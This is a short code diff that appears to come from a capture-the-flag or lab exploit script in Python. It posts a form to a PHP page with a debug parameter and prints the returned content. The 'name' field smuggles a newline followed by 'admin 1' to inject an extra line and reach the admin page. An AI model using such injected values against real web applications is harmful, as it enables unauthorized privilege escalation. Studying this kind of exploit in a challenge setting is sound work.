@@ -84,3 +84,11 @@ name randomusername
 admin 1
 """
 # and thus, it should give us the admin page
+data = {
+    'name' : 'randomusername\nadmin 1',
+    'submit' : 'submit'
+}
+# to activate the debug functionality, we need to use the debug parameter
+response = session.post(URL + 'index.php?debug', data=data)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
